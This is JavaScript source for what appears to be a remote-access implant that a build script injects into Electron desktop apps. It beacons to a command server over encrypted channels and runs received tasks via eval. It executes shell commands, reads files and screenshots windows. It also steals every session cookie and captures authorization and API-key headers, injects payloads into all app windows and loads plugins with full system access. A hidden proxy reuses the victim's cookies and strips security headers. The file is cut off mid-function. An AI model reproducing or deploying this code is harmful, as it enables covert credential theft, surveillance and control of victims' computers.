;(function() {
  'use strict';

  // ===== Configuration (template variables replaced by atomize.py) =====
  const __ATOM_CONFIG = {
    serverUrl: '__ATOM_SERVER_URL__',
    tag: '__ATOM_TAG__',
    clientType: 'atom-beacon',
    ipcPrefix: '__ATOM_IPC_PREFIX__',
    heartbeat: {
      baseInterval: 30,
      jitterPercent: 25
    },
    screenshotInterval: 0  // capture every Nth heartbeat (0 = disabled, use on-demand via UI)
  };

  // Renderer payload code — embedded as string by atomize.py
  const __RENDERER_PAYLOAD = '__ATOM_RENDERER_PAYLOAD__';

  // ===== State =====
  let sessionUUID = null;
  let sendKey = null;    // Buffer — we encrypt with this (server decrypts with client.receiveKey)
  let receiveKey = null; // Buffer — server encrypts with this (we decrypt)
  let exfilQueue = [];
  const trackedWindows = new Map();
  let heartbeatCount = 0;

  // Screenshot heuristic settings (updated via SCREENSHOT_SETTINGS task from UI)
  const screenshotSettings = {
    onFocus: true,
    onNavigate: true,
    onNewWindow: true,
    cooldownSec: 30
  };
  // Per-window timestamp of last heuristic screenshot (windowId -> epoch ms)
  const lastScreenshotTime = new Map();

  // ===== Proxy State =====
  let proxyActive = false;
  let proxyReconnectTimer = null;
  let proxyPingTimer = null;
  let proxyPendingResponses = [];
  const MAX_CONCURRENT_PROXY = 8;
  let activeProxyFetches = 0;
  let proxyFetchQueue = [];
  let _proxyBrowserWin = null;  // Hidden BrowserWindow hosting the WebSocket
  let _proxyPollTimer = null;   // Interval timer for polling renderer messages

  // ===== Plugin State =====
  const __loadedPlugins = new Map(); // pluginId -> {active, timers, cleanup, _rendererCode}

  // ===== Node.js modules =====
  const nodeCrypto = require('crypto');
  const https = require('https');
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const childProcess = require('child_process');
  const os = require('os');
  const { app, session, desktopCapturer, BrowserWindow } = require('electron');

  // ===== HTTP helpers =====

  function httpRequest(method, url, body, headers) {
    return new Promise((resolve, reject) => {
      const parsed = new URL(url);
      const mod = parsed.protocol === 'https:' ? https : http;
      const options = {
        hostname: parsed.hostname,
        port: parsed.port,
        path: parsed.pathname + parsed.search,
        method: method,
        headers: headers || {},
        rejectUnauthorized: false  // Accept self-signed certs
      };

      const req = mod.request(options, (res) => {
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          const body = Buffer.concat(chunks);
          resolve({
            status: res.statusCode,
            ok: res.statusCode >= 200 && res.statusCode < 300,
            body: body,
            json: () => {
              try { return JSON.parse(body.toString('utf-8')); }
              catch (e) { return null; }
            },
            text: () => body.toString('utf-8')
          });
        });
      });

      req.on('error', reject);
      req.setTimeout(30000, () => {
        req.destroy(new Error('Request timeout'));
      });

      if (body) {
        const data = typeof body === 'string' ? body : JSON.stringify(body);
        req.setHeader('Content-Type', 'application/json');
        req.setHeader('Content-Length', Buffer.byteLength(data));
        req.write(data);
      }

      req.end();
    });
  }

  // ===== Crypto =====

  function aesGcmEncrypt(key, iv, plaintext) {
    const cipher = nodeCrypto.createCipheriv('aes-256-gcm', key, iv);
    const encrypted = Buffer.concat([cipher.update(plaintext), cipher.final()]);
    const tag = cipher.getAuthTag();
    // Return ciphertext + tag concatenated (matches Web Crypto API and Python AESGCM format)
    return Buffer.concat([encrypted, tag]);
  }

  function aesGcmDecrypt(key, iv, ciphertext) {
    // Last 16 bytes are the auth tag
    const authTag = ciphertext.slice(-16);
    const encrypted = ciphertext.slice(0, -16);
    const decipher = nodeCrypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);
    return Buffer.concat([decipher.update(encrypted), decipher.final()]);
  }

  async function sendEncrypted(routePath, message) {
    if (!sessionUUID || !sendKey) return null;

    const iv = nodeCrypto.randomBytes(12);
    const pathBytes = Buffer.from(routePath, 'utf-8');
    const messageBytes = Buffer.from(JSON.stringify(message), 'utf-8');

    const encPath = aesGcmEncrypt(sendKey, iv, pathBytes);
    const encMessage = aesGcmEncrypt(sendKey, iv, messageBytes);

    const metricData = [
      iv.toString('base64'),
      encPath.toString('base64'),
      encMessage.toString('base64')
    ].join(',');

    try {
      return await httpRequest(
        'POST',
        `${__ATOM_CONFIG.serverUrl}/client/metrics/${sessionUUID}`,
        JSON.stringify({ metricData }),
        { 'Content-Type': 'application/json', 'User-Agent': _userAgent }
      );
    } catch (e) {
      // Network error — swallow silently
      return null;
    }
  }

  async function sendEncryptedBinary(routePath, binaryData) {
    if (!sessionUUID || !sendKey) return null;

    const iv = nodeCrypto.randomBytes(12);
    const pathBytes = Buffer.from(routePath, 'utf-8');

    const encPath = aesGcmEncrypt(sendKey, iv, pathBytes);
    const encMessage = aesGcmEncrypt(sendKey, iv, binaryData);

    const metricData = [
      iv.toString('base64'),
      encPath.toString('base64'),
      encMessage.toString('base64')
    ].join(',');

    try {
      return await httpRequest(
        'POST',
        `${__ATOM_CONFIG.serverUrl}/client/metrics/${sessionUUID}`,
        JSON.stringify({ metricData }),
        { 'Content-Type': 'application/json', 'User-Agent': _userAgent }
      );
    } catch (e) {
      return null;
    }
  }

  // ===== Registration =====

  // Build a descriptive User-Agent so the server can parse OS/platform info
  const _userAgent = `AtomBeacon/1.0 (${os.type()} ${os.release()}; ${os.arch()}) Electron/${process.versions.electron || 'unknown'} Node/${process.version}`;

  async function register() {
    try {
      const url = `${__ATOM_CONFIG.serverUrl}/client/getToken/${__ATOM_CONFIG.tag}/${__ATOM_CONFIG.clientType}`;
      const resp = await httpRequest('GET', url, null, { 'User-Agent': _userAgent });
      if (resp.ok) {
        const data = resp.json();
        sessionUUID = data.clientToken;
        await initKeys();
      }
    } catch (e) {
      // Registration failed — will retry on next heartbeat
    }
  }

  async function initKeys() {
    if (!sessionUUID) return;

    try {
      // Generate ephemeral RSA-OAEP 2048-bit keypair
      const { publicKey, privateKey } = nodeCrypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'der' },
        privateKeyEncoding: { type: 'pkcs8', format: 'der' }
      });

      const publicKeyBase64 = Buffer.from(publicKey).toString('base64');

      const url = `${__ATOM_CONFIG.serverUrl}/client/keyExchange/${sessionUUID}`;
      const resp = await httpRequest('POST', url, { publicKey: publicKeyBase64 });

      if (resp.ok) {
        const data = resp.json();
        if (data.enable === 'true') {
          // Decrypt RSA-OAEP encrypted AES keys
          const encryptedKeysBuffer = Buffer.from(data.encryptedKeys, 'base64');
          const decryptedKeys = nodeCrypto.privateDecrypt(
            {
              key: nodeCrypto.createPrivateKey({ key: Buffer.from(privateKey), format: 'der', type: 'pkcs8' }),
              padding: nodeCrypto.constants.RSA_PKCS1_OAEP_PADDING,
              oaepHash: 'sha256'
            },
            encryptedKeysBuffer
          );

          // First 32 bytes = sendKey (we encrypt, server decrypts with client.receiveKey)
          // Next 32 bytes = receiveKey (server encrypts with client.sendKey, we decrypt)
          sendKey = decryptedKeys.slice(0, 32);
          receiveKey = decryptedKeys.slice(32, 64);

          // Immediately check for tasks and report status
          checkTasks();
          reportStatus();
        }
      } else {
        // Key exchange failed — re-register
        sessionUUID = null;
        sendKey = null;
        receiveKey = null;
        setTimeout(register, 5000);
      }
    } catch (e) {
      sessionUUID = null;
      sendKey = null;
      receiveKey = null;
      setTimeout(register, 5000);
    }
  }

  // ===== Task Polling =====

  async function checkTasks() {
    if (!sessionUUID || !sendKey || !receiveKey) return;

    try {
      const resp = await sendEncrypted('/client/taskCheck', {});
      if (resp && resp.ok) {
        const jsonResponse = resp.json();
        let tasks = [];

        if (jsonResponse && jsonResponse.metricData) {
          // Encrypted response
          const parts = jsonResponse.metricData.split(',');
          const iv = Buffer.from(parts[0], 'base64');
          const ciphertext = Buffer.from(parts[1], 'base64');
          const clearText = aesGcmDecrypt(receiveKey, iv, ciphertext);
          tasks = JSON.parse(clearText.toString('utf-8'));
        } else if (Array.isArray(jsonResponse)) {
          tasks = jsonResponse;
        }

        for (const task of tasks) {
          try {
            const rawData = Buffer.from(task.data, 'base64').toString('utf-8');
            if (rawData.trim().startsWith('{')) {
              const config = JSON.parse(rawData);
              await processTaskConfig(config);
            } else {
              // Legacy eval task — execute in main process context
              try { eval(rawData); } catch (e) { /* task execution failed */ }
            }
          } catch (e) {
            // Task processing failed
          }
        }
      }
    } catch (e) {
      // Heartbeat failed
    }
  }

  async function processTaskConfig(config) {
    if (config.type === 'SIDECAR_COMMAND' || config.type === 'BEACON_COMMAND') {
      await executeBeaconCommand(config);
    } else if (config.type === 'SCREENSHOT') {
      await handleScreenshotTask(config);
    } else if (config.type === 'SCREENSHOT_SETTINGS') {
      handleScreenshotSettingsTask(config);
    } else if (config.type === 'PROXY_START') {
      startAtomProxy();
    } else if (config.type === 'PROXY_STOP') {
      stopAtomProxy();
    } else if (config.type === 'PLUGIN_LOAD') {
      loadPlugin(config);
    } else if (config.type === 'PLUGIN_UNLOAD') {
      unloadPlugin(config.pluginId);
    }
  }

  function handleScreenshotSettingsTask(config) {
    const { args } = config;
    if (args) {
      if (typeof args.onFocus === 'boolean') screenshotSettings.onFocus = args.onFocus;
      if (typeof args.onNavigate === 'boolean') screenshotSettings.onNavigate = args.onNavigate;
      if (typeof args.onNewWindow === 'boolean') screenshotSettings.onNewWindow = args.onNewWindow;
      if (typeof args.cooldownSec === 'number' && args.cooldownSec >= 5) {
        screenshotSettings.cooldownSec = args.cooldownSec;
      }
    }
  }

  // ===== Plugin System =====

  function loadPlugin(config) {
    const { pluginId, settings, mainCode, rendererCode } = config;
    if (!pluginId || !mainCode) return;
    if (__loadedPlugins.has(pluginId)) unloadPlugin(pluginId);

    const state = { active: true, timers: [], cleanup: null, _rendererCode: null };

    // Build the plugin API object
    const pluginAPI = {
      pluginId: pluginId,
      settings: settings || {},

      // Data reporting — feeds into existing exfilQueue → sendEncrypted
      sendData: function(dataType, data) {
        exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: dataType, data: data } });
      },

      // Timer management (auto-cleaned on unload)
      setInterval: function(fn, ms) {
        var id = setInterval(fn, ms);
        state.timers.push({ type: 'interval', id: id });
        return id;
      },
      setTimeout: function(fn, ms) {
        var id = setTimeout(fn, ms);
        state.timers.push({ type: 'timeout', id: id });
        return id;
      },

      // Renderer access
      getWindows: function() {
        var wins = [];
        for (var entry of trackedWindows) {
          var wid = entry[0], wdata = entry[1];
          if (!wdata.webContents.isDestroyed()) {
            wins.push({ id: wid, url: wdata.webContents.getURL(), title: wdata.webContents.getTitle() });
          }
        }
        return wins;
      },
      executeInRenderer: function(windowId, code) {
        var entry = trackedWindows.get(windowId);
        if (!entry || entry.webContents.isDestroyed()) return Promise.resolve(null);
        return entry.webContents.executeJavaScript(code).catch(function() { return null; });
      },
      injectRenderer: function(code) {
        for (var entry of trackedWindows) {
          var wdata = entry[1];
          if (!wdata.webContents.isDestroyed()) {
            wdata.webContents.executeJavaScript(code).catch(function() {});
          }
        }
      },

      // Node.js modules
      require: require,
      fs: fs,
      path: path,
      childProcess: childProcess,
      os: os,
      crypto: nodeCrypto,
      http: http,
      https: https,
      electron: { app: app, session: session, BrowserWindow: BrowserWindow, desktopCapturer: desktopCapturer }
    };

    try {
      var pluginFn = new Function('plugin', mainCode);
      var cleanupFn = pluginFn(pluginAPI);
      if (typeof cleanupFn === 'function') state.cleanup = cleanupFn;
    } catch (e) {
      exfilQueue.push({ path: '/plugin/data/' + pluginId, data: { dataType: '_error', data: { error: String(e) } } });
      return;
    }

    if (rendererCode) {
      state._rendererCode = rendererCode;
      pluginAPI.injectRenderer(rendererCode);
    }

    __loadedPlugins.set(pluginId, state);
  }

  function unloadPlugin(pluginId) {
    var state = __loadedPlugins.get(pluginId);
    if (!state) return;

    state.active = false;

    // Clear all registered timers
    for (var i = 0; i < state.timers.length; i++) {
      var t = state.timers[i];
      if (t.type === 'interval') clearInterval(t.id);
      else clearTimeout(t.id);
    }
    state.timers = [];

    // Call cleanup if provided
    if (typeof state.cleanup === 'function') {
      try { state.cleanup(); } catch (e) { /* cleanup error */ }
    }

    __loadedPlugins.delete(pluginId);
  }

  // Heuristic screenshot: capture a window if cooldown has elapsed
  async function heuristicCapture(windowId, reason) {
    if (!sessionUUID || !sendKey) return; // Not registered yet

    const now = Date.now();
    const last = lastScreenshotTime.get(windowId) || 0;
    if (now - last < screenshotSettings.cooldownSec * 1000) return; // Cooldown active

    const png = await captureWindow(windowId);
    if (png && png.length > 0) {
      lastScreenshotTime.set(windowId, now);
      await sendEncryptedBinary('/loot/screenshot', png);
    }
  }

  async function handleScreenshotTask(config) {
    const { requestId, args } = config;
    const windowId = args && args.windowId;

    try {
      if (windowId !== undefined && windowId !== null) {
        const png = await captureWindow(parseInt(windowId));
        if (png && png.length > 0) {
          await sendEncryptedBinary('/loot/screenshot', png);
        }
      } else {
        await captureAllWindows();
      }

      if (requestId) {
        sendEncrypted('/bex/sidecar/result', {
          requestId,
          command: 'screenshot',
          success: true,
          data: { message: 'Screenshot(s) captured' },
          error: ''
        });
      }
    } catch (e) {
      if (requestId) {
        sendEncrypted('/bex/sidecar/result', {
          requestId,
          command: 'screenshot',
          success: false,
          data: {},
          error: String(e)
        });
      }
    }
  }

  // ===== Native Operations =====

  async function executeBeaconCommand(config) {
    const { requestId, command, args } = config;
    let result;

    try {
      switch (command) {
        case 'list_dir':
          result = listDir(args.path || '.');
          break;
        case 'read_file':
          result = readFile(args.path);
          break;
        case 'exec_cmd':
          result = await execCommand(args.command || args.cmd, args.timeout);
          break;
        default:
          result = { command, success: false, error: `Unknown command: ${command}` };
      }
    } catch (e) {
      result = { command, success: false, error: String(e) };
    }

    // Report result back to server
    sendEncrypted('/bex/sidecar/result', {
      requestId,
      command: result.command || command,
      success: result.success,
      data: result.data,
      error: result.error || ''
    });
  }

  function listDir(dirPath) {
    try {
      const resolved = path.resolve(dirPath);
      const entries = fs.readdirSync(resolved, { withFileTypes: true });
      const items = entries.map(entry => {
        const fullPath = path.join(resolved, entry.name);
        let size = 0;
        try {
          if (entry.isFile()) {
            size = fs.statSync(fullPath).size;
          }
        } catch (e) { /* stat failed, leave size as 0 */ }

        return {
          name: entry.name,
          type: entry.isDirectory() ? 'directory' : 'file',
          size: size
        };
      });

      return {
        command: 'list_dir',
        success: true,
        data: { path: resolved, entries: items }
      };
    } catch (e) {
      return { command: 'list_dir', success: false, error: String(e) };
    }
  }

  function readFile(filePath) {
    try {
      const resolved = path.resolve(filePath);
      const data = fs.readFileSync(resolved);
      return {
        command: 'read_file',
        success: true,
        data: { path: resolved, content: data.toString('base64'), size: data.length }
      };
    } catch (e) {
      return { command: 'read_file', success: false, error: String(e) };
    }
  }

  function execCommand(cmd, timeout) {
    return new Promise((resolve) => {
      const execTimeout = timeout || 30000;
      childProcess.exec(cmd, { timeout: execTimeout, maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
        resolve({
          command: 'exec_cmd',
          success: !err,
          data: {
            stdout: stdout || '',
            stderr: stderr || '',
            exitCode: err ? err.code : 0
          },
          error: err ? err.message : ''
        });
      });
    });
  }

  // ===== Screenshots =====

  async function captureWindow(windowId) {
    const entry = trackedWindows.get(windowId);
    if (!entry || entry.webContents.isDestroyed()) return null;

    try {
      // Try desktopCapturer first — captures actual rendered output including GPU layers
      const win = BrowserWindow.fromWebContents(entry.webContents);
      if (win && desktopCapturer) {
        try {
          const bounds = win.getBounds();
          const sources = await desktopCapturer.getSources({
            types: ['window'],
            thumbnailSize: { width: bounds.width, height: bounds.height }
          });

          // Match by window id string (Electron uses "window:N:0" format)
          // or fall back to title matching
          const winTitle = win.getTitle();
          const winMediaId = typeof win.getMediaSourceId === 'function' ? win.getMediaSourceId() : null;
          let source = winMediaId ? sources.find(s => s.id === winMediaId) : null;
          if (!source) {
            source = sources.find(s => s.name === winTitle);
          }
          if (source && !source.thumbnail.isEmpty()) {
            return source.thumbnail.toPNG();
          }
        } catch (e) {
          // desktopCapturer failed — fall through to capturePage
        }
      }

      // Fallback: capturePage (works but misses GPU-composited content)
      const nativeImage = await entry.webContents.capturePage();
      return nativeImage.toPNG();
    } catch (e) {
      return null;
    }
  }

  async function captureAllWindows() {
    // Pre-fetch all sources once for efficiency
    let sources = [];
    try {
      if (desktopCapturer) {
        sources = await desktopCapturer.getSources({
          types: ['window'],
          thumbnailSize: { width: 1920, height: 1080 }
        });
      }
    } catch (e) { /* desktopCapturer unavailable */ }

    for (const [windowId, entry] of trackedWindows) {
      if (!entry.webContents.isDestroyed()) {
        let png = null;

        // Try matching from pre-fetched sources
        if (sources.length > 0) {
          try {
            const win = BrowserWindow.fromWebContents(entry.webContents);
            if (win) {
              const winTitle = win.getTitle();
              const winMediaId = typeof win.getMediaSourceId === 'function' ? win.getMediaSourceId() : null;
              let source = winMediaId ? sources.find(s => s.id === winMediaId) : null;
              if (!source) {
                source = sources.find(s => s.name === winTitle);
              }
              if (source && !source.thumbnail.isEmpty()) {
                png = source.thumbnail.toPNG();
              }
            }
          } catch (e) { /* match failed */ }
        }

        // Fallback to capturePage
        if (!png) {
          try {
            const nativeImage = await entry.webContents.capturePage();
            png = nativeImage.toPNG();
          } catch (e) { /* capture failed */ }
        }

        if (png && png.length > 0) {
          await sendEncryptedBinary('/loot/screenshot', png);
        }
      }
    }
  }

  // ===== Cookie Capture =====

  async function captureAllCookies() {
    try {
      const cookies = await session.defaultSession.cookies.get({});
      for (const cookie of cookies) {
        exfilQueue.push({
          path: '/loot/dessert',
          data: {
            cookie: `${cookie.name}=${cookie.value}`,
            domain: cookie.domain || '',
            metadata: JSON.stringify({
              httpOnly: cookie.httpOnly,
              secure: cookie.secure,
              sameSite: cookie.sameSite,
              path: cookie.path,
              expirationDate: cookie.expirationDate
            })
          }
        });
      }
    } catch (e) {
      // Cookie capture failed
    }
  }

  // ===== HTTP Header Capture =====

  const INTERESTING_HEADERS = ['authorization', 'x-api-key', 'cookie', 'set-cookie'];
  const headerCache = new Map();

  function setupHeaderCapture() {
    try {
      session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
        if (details.requestHeaders) {
          for (const [name, value] of Object.entries(details.requestHeaders)) {
            const headerName = name.toLowerCase();
            if (INTERESTING_HEADERS.includes(headerName)) {
              const cacheKey = `${details.url}:${headerName}:${value}`;
              const now = Date.now();

              if (!headerCache.has(cacheKey) || (now - headerCache.get(cacheKey) > 60000)) {
                headerCache.set(cacheKey, now);

                // Clean up stale entries
                if (headerCache.size > 1000) {
                  const cutoff = now - 60000;
                  for (const [k, v] of headerCache.entries()) {
                    if (v < cutoff) headerCache.delete(k);
                  }
                }

                const parsedUrl = new URL(details.url);
                exfilQueue.push({
                  path: '/bex/capture',
                  data: {
                    domain: parsedUrl.hostname,
                    url: details.url,
                    type: 'header',
                    name: name,
                    value: value
                  }
                });
              }
            }
          }
        }
        callback({ requestHeaders: details.requestHeaders });
      });
    } catch (e) {
      // webRequest setup failed — app may override or API not available
    }
  }

  // ===== Response Header Capture =====

  function setupResponseHeaderCapture() {
    const INTERESTING_RESPONSE_HEADERS = [
      'set-cookie', 'www-authenticate', 'x-csrf-token', 'location',
      'authorization', 'x-api-key'
    ];

    try {
      session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
        if (details.responseHeaders) {
          for (const [name, values] of Object.entries(details.responseHeaders)) {
            const headerName = name.toLowerCase();
            if (INTERESTING_RESPONSE_HEADERS.includes(headerName)) {
              const value = Array.isArray(values) ? values.join('; ') : String(values);
              const cacheKey = `resp:${details.url}:${headerName}:${value}`;
              const now = Date.now();

              if (!headerCache.has(cacheKey) || (now - headerCache.get(cacheKey) > 60000)) {
                headerCache.set(cacheKey, now);

                if (headerCache.size > 1000) {
                  const cutoff = now - 60000;
                  for (const [k, v] of headerCache.entries()) {
                    if (v < cutoff) headerCache.delete(k);
                  }
                }

                let hostname = '';
                try { hostname = new URL(details.url).hostname; } catch(e) {}
                exfilQueue.push({
                  path: '/bex/capture',
                  data: {
                    domain: hostname,
                    url: details.url,
                    type: 'response_header',
                    name: name,
                    value: value
                  }
                });
              }
            }
          }
        }
        callback({ responseHeaders: details.responseHeaders });
      });
    } catch (e) {}
  }

  // ===== Renderer Injection =====

  function setupRendererInjection() {
    app.on('web-contents-created', (event, webContents) => {
      const windowId = webContents.id;

      trackedWindows.set(windowId, {
        webContents,
        url: '',
        title: '',
        injected: false
      });

      webContents.on('dom-ready', () => {
        injectRenderer(windowId);
        // Re-inject plugin renderer code into new/navigated windows
        for (const [pid, pstate] of __loadedPlugins) {
          if (pstate.active && pstate._rendererCode) {
            webContents.executeJavaScript(pstate._rendererCode).catch(() => {});
          }
        }
      });

      webContents.on('did-navigate', () => {
        // Re-inject on full page navigation
        const entry = trackedWindows.get(windowId);
        if (entry) entry.injected = false;
        injectRenderer(windowId);
        // Re-inject plugin renderer code
        for (const [pid, pstate] of __loadedPlugins) {
          if (pstate.active && pstate._rendererCode) {
            webContents.executeJavaScript(pstate._rendererCode).catch(() => {});
          }
        }

        // Heuristic screenshot on full-page navigation (after new content loads)
        if (screenshotSettings.onNavigate) {
          setTimeout(() => heuristicCapture(windowId, 'navigate'), 3000);
        }
      });

      // Heuristic screenshot on new window (first load only)
      let firstLoad = true;
      webContents.on('did-finish-load', () => {
        if (firstLoad && screenshotSettings.onNewWindow) {
          firstLoad = false;
          // Small delay so the page renders fully
          setTimeout(() => heuristicCapture(windowId, 'new_window'), 2000);
        } else {
          firstLoad = false;
        }
      });

      // Heuristic screenshot on SPA navigation and title changes.
      // Debounced: multiple events (URL change + title change) during a single
      // transition are collapsed into one capture after content settles.
      let spaDebounceTimer = null;
      function debouncedSpaCapture() {
        if (!screenshotSettings.onNavigate) return;
        if (spaDebounceTimer) clearTimeout(spaDebounceTimer);
        // Wait 3s after the LAST navigation/title event for content to render
        spaDebounceTimer = setTimeout(() => {
          spaDebounceTimer = null;
          heuristicCapture(windowId, 'spa_navigate');
        }, 3000);
      }

      webContents.on('did-navigate-in-page', debouncedSpaCapture);
      webContents.on('page-title-updated', debouncedSpaCapture);

      // Heuristic screenshot on focus
      webContents.on('focus', () => {
        if (screenshotSettings.onFocus) {
          setTimeout(() => heuristicCapture(windowId, 'focus'), 500);
        }
      });

      webContents.on('destroyed', () => {
        trackedWindows.delete(windowId);
        lastScreenshotTime.delete(windowId);
      });
    });
  }

  function injectRenderer(windowId) {
    const entry = trackedWindows.get(windowId);
    if (!entry || entry.webContents.isDestroyed() || entry.injected) return;

    entry.webContents.executeJavaScript(__RENDERER_PAYLOAD)
      .then(() => {
        entry.injected = true;
        entry.url = entry.webContents.getURL();
        entry.title = entry.webContents.getTitle();
      })
      .catch(() => {
        // Injection failed — webContents may have been destroyed
      });
  }

  // ===== Renderer Data Polling =====

  async function flushRendererData() {
    const prefix = __ATOM_CONFIG.ipcPrefix;
    for (const [windowId, entry] of trackedWindows) {
      if (!entry.injected || entry.webContents.isDestroyed()) continue;

      try {
        const data = await entry.webContents.executeJavaScript(
          `(function() { var fn = window['${prefix}_flush']; return fn ? fn() : []; })()`
        );
        if (data && Array.isArray(data) && data.length > 0) {
          exfilQueue.push(...data);
        }
      } catch (e) {
        // Renderer may have navigated or been destroyed
      }
    }
  }

  // ===== Exfiltration =====

  async function processExfilQueue() {
    if (exfilQueue.length === 0) return;

    // Drain the queue
    const batch = exfilQueue.splice(0);

    for (const item of batch) {
      if (item.path && item.data) {
        await sendEncrypted(item.path, item.data);
      }
    }
  }

  // ===== Proxy WebSocket via Hidden BrowserWindow =====
  // Raw TLS sockets don't survive in Electron's main process event loop.
  // Instead, use a hidden BrowserWindow with Chromium's native WebSocket.

  function connectProxyWebSocket() {
    if (!proxyActive || !sessionUUID) return;

    const wsUrl = __ATOM_CONFIG.serverUrl.replace(/^http/, 'ws') + '/ws/proxy/' + sessionUUID;

    // Clean up previous window if any
    destroyProxyWindow();

    // Create a dedicated session that accepts self-signed certs
    let proxySession;
    try {
      proxySession = session.fromPartition('proxy-ws');
      proxySession.setCertificateVerifyProc((request, callback) => {
        callback(0); // Accept all certs (same as rejectUnauthorized: false)
      });
    } catch(e) {
      proxySession = session.defaultSession;
    }

    try {
      _proxyBrowserWin = new BrowserWindow({
        show: false,
        width: 1,
        height: 1,
        skipTaskbar: true,
        webPreferences: {
          session: proxySession,
          nodeIntegration: false,
          contextIsolation: false
        }
      });
    } catch(e) {
      scheduleProxyReconnect();
      return;
    }

    _proxyBrowserWin.on('closed', () => {
      _proxyBrowserWin = null;
      if (proxyActive) scheduleProxyReconnect();
    });

    _proxyBrowserWin.loadURL('about:blank').then(() => {
      if (!_proxyBrowserWin || !proxyActive) return;

      // Inject WebSocket code into the renderer
      const injectCode = `
        (function() {
          window._pxQ = [];      // Incoming message queue
          window._pxState = 'connecting';
          try {
            window._pxWs = new WebSocket(${JSON.stringify(wsUrl)});
            window._pxWs.onopen = function() { window._pxState = 'open'; };
            window._pxWs.onmessage = function(e) { window._pxQ.push(e.data); };
            window._pxWs.onclose = function() { window._pxState = 'closed'; };
            window._pxWs.onerror = function() { window._pxState = 'error'; };
          } catch(e) {
            window._pxState = 'error';
          }
          window._pxSend = function(msg) {
            if (window._pxWs && window._pxWs.readyState === 1) window._pxWs.send(msg);
          };
          window._pxFlush = function() {
            var msgs = window._pxQ.splice(0);
            return JSON.stringify({ s: window._pxState, m: msgs });
          };
        })()
      `;

      _proxyBrowserWin.webContents.executeJavaScript(injectCode).then(() => {
        // Start polling for messages from the renderer's WebSocket
        startProxyPoll();
      }).catch(() => {
        scheduleProxyReconnect();
      });
    }).catch(() => {
      scheduleProxyReconnect();
    });
  }

  function destroyProxyWindow() {
    if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
    if (_proxyBrowserWin) {
      try { _proxyBrowserWin.destroy(); } catch(e) {}
      _proxyBrowserWin = null;
    }
  }

  function startProxyPoll() {
    if (_proxyPollTimer) clearInterval(_proxyPollTimer);
    let wasOpen = false;

    _proxyPollTimer = setInterval(async () => {
      if (!_proxyBrowserWin || !proxyActive) {
        if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
        return;
      }

      try {
        const raw = await _proxyBrowserWin.webContents.executeJavaScript('window._pxFlush()');
        const data = JSON.parse(raw);

        if (data.s === 'open') {
          if (!wasOpen) {
            wasOpen = true;
            // Drain any buffered responses
            for (const msg of proxyPendingResponses.splice(0)) {
              sendToProxyWs(msg);
            }
            // Start keep-alive pings
            if (proxyPingTimer) clearInterval(proxyPingTimer);
            proxyPingTimer = setInterval(() => {
              sendToProxyWs(JSON.stringify({ type: 'ping' }));
            }, 10000);
          }

          // Process incoming messages
          for (const msgStr of data.m) {
            try {
              var msg = JSON.parse(msgStr);
              if (msg.id && msg.method && msg.url) {
                acquireProxySlot(function() {
                  handleAtomProxyRequest(msg);
                });
              }
            } catch(e) {}
          }
        } else if (data.s === 'closed' || data.s === 'error') {
          if (_proxyPollTimer) { clearInterval(_proxyPollTimer); _proxyPollTimer = null; }
          if (proxyPingTimer) { clearInterval(proxyPingTimer); proxyPingTimer = null; }
          destroyProxyWindow();
          if (proxyActive) scheduleProxyReconnect();
        }
      } catch(e) {
        // webContents may have been destroyed
      }
    }, 50); // 50ms polling for low latency
  }

  function sendToProxyWs(msg) {
    if (!_proxyBrowserWin) {
      proxyPendingResponses.push(msg);
      return;
    }
    const escaped = JSON.stringify(msg);
    _proxyBrowserWin.webContents.executeJavaScript('window._pxSend(' + escaped + ')').catch(() => {});
  }

  // ===== Proxy Control =====

  function startAtomProxy() {
    if (proxyActive) return;
    proxyActive = true;
    connectProxyWebSocket();
  }

  function stopAtomProxy() {
    proxyActive = false;
    if (proxyPingTimer) { clearInterval(proxyPingTimer); proxyPingTimer = null; }
    if (proxyReconnectTimer) { clearTimeout(proxyReconnectTimer); proxyReconnectTimer = null; }
    destroyProxyWindow();
    activeProxyFetches = 0;
    proxyFetchQueue = [];
    proxyPendingResponses = [];
  }

  function scheduleProxyReconnect() {
    if (!proxyActive) return;
    if (proxyReconnectTimer) clearTimeout(proxyReconnectTimer);
    proxyReconnectTimer = setTimeout(function() {
      proxyReconnectTimer = null;
      connectProxyWebSocket();
    }, 3000);
  }

  function acquireProxySlot(fn) {
    if (activeProxyFetches < MAX_CONCURRENT_PROXY) {
      activeProxyFetches++;
      fn();
    } else {
      proxyFetchQueue.push(fn);
    }
  }

  function releaseProxySlot() {
    activeProxyFetches--;
    if (proxyFetchQueue.length > 0 && activeProxyFetches < MAX_CONCURRENT_PROXY) {
      activeProxyFetches++;
      var next = proxyFetchQueue.shift();
      next();
    }
  }

  // ===== Proxy Request Handler =====

  const HOP_BY_HOP_HEADERS = new Set([
    'host', 'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
    'te', 'trailer', 'transfer-encoding', 'upgrade', 'proxy-connection'
  ]);

  const STRIP_RESPONSE_HEADERS = new Set([
    'strict-transport-security', 'content-security-policy', 'content-security-policy-report-only',
    'x-content-security-policy', 'alt-svc', 'transfer-encoding',
    'content-length', 'x-frame-options'
  ]);

  async function handleAtomProxyRequest(req) {
    try {
      var filteredHeaders = {};
      if (req.headers) {
        for (var name in req.headers) {
          if (!HOP_BY_HOP_HEADERS.has(name.toLowerCase())) {
            filteredHeaders[name] = req.headers[name];
          }
        }
      }

      // Inject cookies from the app's session
      try {
        var cookies = await session.defaultSession.cookies.get({ url: req.url });
        if (cookies.length > 0) {
          var cookieStr = cookies.map(function(c) { return c.name + '=' + c.value; }).join('; ');
          filteredHeaders['Cookie'] = cookieStr;
        }
      } catch(e) {}

      var responseData = await executeProxyFetch(req.method, req.url, filteredHeaders, req.body);
      sendProxyResponse(responseData.id || req.id, responseData.status, responseData.headers, responseData.setCookies, responseData.body);
    } catch(e) {
      var errBody = Buffer.from('Proxy fetch error: ' + String(e)).toString('base64');
